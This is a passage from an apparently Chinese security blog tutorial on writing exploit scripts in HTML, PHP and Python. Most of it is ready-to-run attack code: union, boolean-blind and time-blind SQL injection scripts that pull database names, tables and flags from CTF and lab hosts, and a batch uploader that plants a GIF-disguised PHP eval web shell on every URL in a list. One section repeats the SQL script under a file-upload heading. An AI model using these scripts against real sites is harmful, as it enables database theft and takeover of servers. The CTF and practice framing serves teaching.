<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"利用"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>多增加一点，通过输入url来进行注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">		<span class="function"><span class="keyword">function</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> x  = <span class="built_in">document</span>.getElementById(<span class="string">"url"</span>).value</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> c  = <span class="built_in">document</span>.getElementById(<span class="string">"myform"</span>).action=x</span></span><br><span class="line">			if(x)&#123;</span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.getElementById(<span class="string">'myform'</span>).submit()</span></span><br><span class="line"><span class="actionscript">			&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="actionscript">				alert(<span class="string">"请填写网址！"</span>)</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>简单的HTML EXP编写<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"myform"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"url"</span> <span class="attr">size</span>=<span class="string">"50px"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">value</span>=<span class="string">"1.1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())#"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"exploit"</span> <span class="attr">onclick</span>=<span class="string">"exploit()"</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="二、简单的PHP编写注入EXP"><a href="#二、简单的PHP编写注入EXP" class="headerlink" title="二、简单的PHP编写注入EXP"></a>二、简单的PHP编写注入EXP</h1><blockquote>
<p><strong>fsockopen()</strong>将返回一个文件句柄，之后可以被其他文件类函数调用（例如：<a href="mk:@MSITStore:C:\Users\23242\Desktop\悬剑武器库\tools\实验手册\php7.3.8（官网下载）.chm::/res/function.fgets.html">fgets()</a>，<a href="mk:@MSITStore:C:\Users\23242\Desktop\悬剑武器库\tools\实验手册\php7.3.8（官网下载）.chm::/res/function.fgetss.html">fgetss()</a>，<a href="mk:@MSITStore:C:\Users\23242\Desktop\悬剑武器库\tools\实验手册\php7.3.8（官网下载）.chm::/res/function.fwrite.html">fwrite()</a>，<a href="mk:@MSITStore:C:\Users\23242\Desktop\悬剑武器库\tools\实验手册\php7.3.8（官网下载）.chm::/res/function.fclose.html">fclose()</a>还有<a href="mk:@MSITStore:C:\Users\23242\Desktop\悬剑武器库\tools\实验手册\php7.3.8（官网下载）.chm::/res/function.feof.html">feof()</a>）。如果调用失败，将返回<strong><code>FALSE</code></strong>。 </p>
<p><strong>fsockopen</strong>是用来模拟发包的</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$site=<span class="string">"ebc14e18-2cda-4cd7-b884-c4261c48768f.challenge.ctf.show"</span>;</span><br><span class="line">$payload=<span class="string">"?id=1.1%27%20union%20select%201,2,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database())%23"</span>;</span><br><span class="line"></span><br><span class="line">$fp = fsockopen($site, <span class="number">8080</span>, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!$fp)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$errstr ($errno)&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	$out = <span class="string">"GET /&#123;$payload&#125; HTTP/1.1\r\n"</span>;</span><br><span class="line">	$out .= <span class="string">"Host: &#123;$site&#125;:8080\r\n"</span>;</span><br><span class="line">	$out .= <span class="string">"Connection: keep-alive\r\n\r\n"</span>;		</span><br><span class="line">	fwrite($fp, $out);</span><br><span class="line">	<span class="keyword">while</span> (!feof($fp))&#123;</span><br><span class="line">		<span class="keyword">echo</span> fgets($fp, <span class="number">128</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>匹配你想要的结果</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$n=<span class="number">0</span>;</span><br><span class="line">$site=<span class="string">"ebc14e18-2cda-4cd7-b884-c4261c48768f.challenge.ctf.show"</span>;</span><br><span class="line">$payload=<span class="string">"?id=1.1%27%20union%20select%201,2,(select%20group_concat(%27~%27,table_name,%27~%27)%20from%20information_schema.tables%20where%20table_schema=database())%23"</span>;</span><br><span class="line"></span><br><span class="line">$fp = fsockopen($site, <span class="number">8080</span>, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!$fp)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$errstr ($errno)&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	$out = <span class="string">"GET /&#123;$payload&#125; HTTP/1.1\r\n"</span>;</span><br><span class="line">	$out .= <span class="string">"Host: &#123;$site&#125;:8080\r\n"</span>;</span><br><span class="line">	$out .= <span class="string">"Connection: keep-alive\r\n\r\n"</span>;		</span><br><span class="line">	fwrite($fp, $out);</span><br><span class="line">	<span class="keyword">while</span> (!feof($fp))&#123;</span><br><span class="line">		$n += <span class="number">1</span>;</span><br><span class="line">		$html = fgets($fp, <span class="number">128</span>);</span><br><span class="line">		preg_match_all(<span class="string">"/~(.*?)~/"</span>, $html, $hash);</span><br><span class="line">		<span class="keyword">if</span>($n==<span class="number">27</span>)&#123;</span><br><span class="line">			print_r($hash);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="三、简单的python编写注入EXP"><a href="#三、简单的python编写注入EXP" class="headerlink" title="三、简单的python编写注入EXP"></a>三、简单的python编写注入EXP</h1><blockquote>
<p>利用正则</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取payload源码</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://81426808-4f66-48bf-84f4-327b8ba4b8c2.challenge.ctf.show:8080/"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">(url)</span>:</span></span><br><span class="line">    payload = <span class="string">"id=1.1%27%20union%20select%201,2,(select%20group_concat(%27~%27,table_name,%27~%27)%20from%20information_schema.tables%20where%20table_schema=database())%23"</span></span><br><span class="line">    res = requests.get(url,payload)</span><br><span class="line">    result = re.findall(<span class="string">'~(.*?)~'</span>,res.text)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">print(<span class="string">'.'</span>.join(get_result(url)))</span><br></pre></td></tr></table></figure></div>

<h1 id="四、POST的exp编写"><a href="#四、POST的exp编写" class="headerlink" title="四、POST的exp编写"></a>四、POST的exp编写</h1><p>python写法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/27</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取payload源码</span></span><br><span class="line">url = <span class="string">"http://inject2.lab.aqlab.cn:81/Pass-05/index.php"</span></span><br><span class="line">payload = <span class="string">"' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 #"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">(url)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span> : payload,</span><br><span class="line">        <span class="string">'password'</span> : <span class="string">'1'</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url,data)</span><br><span class="line">    result = re.findall(<span class="string">'Your Login(.*?)&lt;br&gt;Your Password'</span>,res.text)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">print(<span class="string">'.'</span>.join(get_result(url)))</span><br></pre></td></tr></table></figure></div>

<p>PHP写法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  模拟post进行url请求</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@param</span> string $url</span></span><br><span class="line"><span class="comment"> * 	<span class="doctag">@param</span> array $post_data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	$url=<span class="string">'http://inject2.lab.aqlab.cn:81/Pass-05/index.php'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">request_post</span><span class="params">($url = <span class="string">''</span>, $post_data = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($url) || <span class="keyword">empty</span>($post_data))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$o = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($post_data <span class="keyword">as</span> $k =&gt; $v ) &#123;</span><br><span class="line">			$o .= <span class="string">"$k="</span>.urlencode($v).<span class="string">"&amp;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$post_data =substr($o,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line">		$postUrl = $url;</span><br><span class="line">		$curlPost = $post_data;</span><br><span class="line">		$ch = curl_init(); <span class="comment">//初始化curl</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_URL, $postUrl); <span class="comment">// 抓取指定网页</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 设置header</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 要求结果为字符串并且输出到屏幕上</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>); <span class="comment">//post提交方式</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);</span><br><span class="line">		$data = curl_exec($ch); <span class="comment">//运行curl</span></span><br><span class="line">		curl_close($ch);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $data;</span><br><span class="line">	&#125;</span><br><span class="line">	$post_data = <span class="keyword">array</span>(<span class="string">"username"</span>=&gt;<span class="string">"' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 #"</span>,<span class="string">"password"</span>=&gt;<span class="string">"1"</span>,<span class="string">"submit"</span>=&gt;<span class="string">"%E7%99%BB%E5%BD%95"</span>);</span><br><span class="line">	$html=request_post($url,$post_data);</span><br><span class="line">	preg_match(<span class="string">'/Your Login(.*?)Yo/'</span>,$html, $match);</span><br><span class="line">	<span class="keyword">echo</span> join($match);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="五、文件上传getshell，php写法"><a href="#五、文件上传getshell，php写法" class="headerlink" title="五、文件上传getshell，php写法"></a>五、文件上传getshell，php写法</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  模拟post进行url请求</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@param</span> string $url</span></span><br><span class="line"><span class="comment"> * 	<span class="doctag">@param</span> array $post_data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">	$url=<span class="string">'http://inject2.lab.aqlab.cn:81/Pass-05/index.php'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">request_post</span><span class="params">($url = <span class="string">''</span>, $post_data = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($url) || <span class="keyword">empty</span>($post_data))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$o = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($post_data <span class="keyword">as</span> $k =&gt; $v ) &#123;</span><br><span class="line">			$o .= <span class="string">"$k="</span>.urlencode($v).<span class="string">"&amp;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$post_data =substr($o,<span class="number">0</span>,<span class="number">-1</span>);</span><br><span class="line">		$postUrl = $url;</span><br><span class="line">		$curlPost = $post_data;</span><br><span class="line">		$ch = curl_init(); <span class="comment">//初始化curl</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_URL, $postUrl); <span class="comment">// 抓取指定网页</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); <span class="comment">// 设置header</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 要求结果为字符串并且输出到屏幕上</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>); <span class="comment">//post提交方式</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_POSTFIELDS, $curlPost);</span><br><span class="line">		$data = curl_exec($ch); <span class="comment">//运行curl</span></span><br><span class="line">		curl_close($ch);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $data;</span><br><span class="line">	&#125;</span><br><span class="line">	$post_data = <span class="keyword">array</span>(<span class="string">"username"</span>=&gt;<span class="string">"' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 #"</span>,<span class="string">"password"</span>=&gt;<span class="string">"1"</span>,<span class="string">"submit"</span>=&gt;<span class="string">"%E7%99%BB%E5%BD%95"</span>);</span><br><span class="line">	$html=request_post($url,$post_data);</span><br><span class="line">	preg_match(<span class="string">'/Your Login(.*?)Yo/'</span>,$html, $match);</span><br><span class="line">	<span class="keyword">echo</span> join($match);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="六、文件上传批量getshell，php写法"><a href="#六、文件上传批量getshell，php写法" class="headerlink" title="六、文件上传批量getshell，php写法"></a>六、文件上传批量getshell，php写法</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行参数&gt;3</span></span><br><span class="line"><span class="keyword">if</span>(count($argv)&lt;<span class="number">3</span>)&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\r\n\tUse Examply： "</span>.$argv[<span class="number">0</span>].<span class="string">" url.txt save.txt\r\n"</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发包返回html页面</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">http_send</span><span class="params">($host, $packet)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">#echo "\n\r\nRequest:\n".$packet;</span></span><br><span class="line">	$sock = fsockopen($host, <span class="number">8080</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!$sock)&#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\n[-] No response from &#123;$host&#125;:8080 Trying again..."</span>;</span><br><span class="line">		$sock = fsockopen($host, <span class="number">8080</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fwrite($sock, $packet);</span><br><span class="line">	<span class="keyword">while</span> (!feof($sock)) &#123;</span><br><span class="line">	</span><br><span class="line">		$resp=fread($sock,<span class="number">1024</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose($sock);</span><br><span class="line">	<span class="keyword">return</span> $resp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># burp抓的包进行写入</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">data</span><span class="params">($host,$filename)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	$payload .= <span class="string">"------WebKitFormBoundaryF1mJrJElc0yUu1HA\r\n"</span>;</span><br><span class="line">	$payload .= <span class="string">"Content-Disposition: form-data; name=\"file\"; filename=\"&#123;$filename&#125;\"\r\n"</span>;</span><br><span class="line">	$payload .= <span class="string">"Content-Type: image/png\r\n\r\n"</span>;</span><br><span class="line">	$payload .= <span class="string">'GIF89a'</span>.<span class="string">"\r\n"</span>.<span class="string">'&lt;?php eval($_REQUEST[shell])?&gt;'</span>.<span class="string">"\r\n\r\n"</span>;</span><br><span class="line">	$payload .= <span class="string">"------WebKitFormBoundaryF1mJrJElc0yUu1HA--\r\n"</span>;</span><br><span class="line">	$packet = <span class="string">"POST /upload.php HTTP/1.1\r\n"</span>;</span><br><span class="line">	$packet .= <span class="string">"Host: &#123;$host&#125;:8080\r\n"</span>;</span><br><span class="line">	$packet .= <span class="string">"Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryF1mJrJElc0yUu1HA\r\n"</span>;</span><br><span class="line">	$packet .= <span class="string">"Content-Length: "</span>.strlen($payload).<span class="string">"\r\n"</span>;</span><br><span class="line">	$packet .= <span class="string">"Connection: close\r\n\r\n"</span>;</span><br><span class="line">	$packet .= $payload;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $packet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用发包</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">	$filename = <span class="string">"b.php"</span>;</span><br><span class="line">	$hosts = <span class="string">"&#123;$host&#125;"</span>;</span><br><span class="line">	$packet=data($hosts,$filename);</span><br><span class="line">	$html=http_send($hosts,$packet);</span><br><span class="line">	preg_match_all(<span class="string">'/msg\":\"(.*?)\"/'</span>,$html,$match);</span><br><span class="line">	<span class="keyword">return</span> $match[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结果输入到文件中</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">w</span><span class="params">($fileName,$data)</span></span>&#123;</span><br><span class="line">	fwrite(fopen($fileName,<span class="string">"a+"</span>),$data.<span class="string">"\r\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url_txt = $argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">$myurl = file($url_txt);</span><br><span class="line"></span><br><span class="line">$save_file = $argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将数组遍历出来</span></span><br><span class="line"><span class="keyword">foreach</span> ($myurl <span class="keyword">as</span> $value) &#123;</span><br><span class="line">		<span class="comment">#echo "Testing &#123;$value&#125;\r\n";</span></span><br><span class="line">		$v=substr($value,strpos($value,<span class="string">"//"</span>)+<span class="number">2</span>);  </span><br><span class="line">		$v=trim(str_replace(<span class="string">"/"</span>, <span class="string">""</span>, $v));</span><br><span class="line">		$html=exploit($v);</span><br><span class="line">		$result = <span class="string">"http://&#123;$v&#125;:8080/"</span>.trim(str_replace(<span class="string">"\""</span>,<span class="string">""</span>,substr($html[<span class="number">0</span>],strpos($html[<span class="number">0</span>],<span class="string">":"</span>)+<span class="number">2</span>)));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"\r\n"</span>.$result;</span><br><span class="line">		w($save_file,$result);</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\r\n\r\n[+]-----------------------------WIN--------------------\r\n\r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Save complete in &#123;$save_file&#125;\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print "\n\r\n\nResponse:\n".$html."\r\n";</span></span><br><span class="line"><span class="comment">// print "\r\n\r\n[+]----------------------------Result-------------------------------\r\n";</span></span><br><span class="line"><span class="comment">// preg_match_all('/msg\":\"(.*?)\"/',$html,$match);</span></span><br><span class="line"><span class="comment">// echo "\r\n\r\n".join($match[0])."\r\n";</span></span><br><span class="line"><span class="comment">// if ($match[0])&#123;</span></span><br><span class="line"><span class="comment">// print "\r\n\r\n[+]-----------------------------WIN---------------------------------\r\n";</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">// 	print "\r\n\r\n[+]----------------------------FAILED-------------------------------\r\n";</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="七、布尔盲注python写法"><a href="#七、布尔盲注python写法" class="headerlink" title="七、布尔盲注python写法"></a>七、布尔盲注python写法</h1><p>python写法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://www.moonteamweb.com/mysqlinj.php?id="</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line">sql=<span class="string">"select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flagbab'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line"><span class="comment">#sql= "select flag4sa from ctfshow.flagbab"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"1 and if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;'&#123;&#125;',1,0)"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        params=payload.format(sql,i,mid)</span><br><span class="line">        res = requests.get(url+params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"所谓SQL注入"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[*] Complete! Result Is &gt;&gt;&gt; &#123;&#125;'</span>.format(flag))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>



<h1 id="八、时间盲注python写法"><a href="#八、时间盲注python写法" class="headerlink" title="八、时间盲注python写法"></a>八、时间盲注python写法</h1><p>python写法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/10</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://www.web15.com/mysqlinj.php?id="</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查库名</span></span><br><span class="line">sql=<span class="string">"select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema='ctfshow' and table_name='flagbab'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line"><span class="comment">#sql= "select flag4sa from ctfshow.flagbab"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">'1 or if(ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;"&#123;&#125;",sleep(1.5),1) '</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        params=payload.format(sql,i,mid)</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url+params)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end -start)</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">1.4</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(i))</span><br><span class="line">        flag += chr(tail)</span><br><span class="line">        print(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span 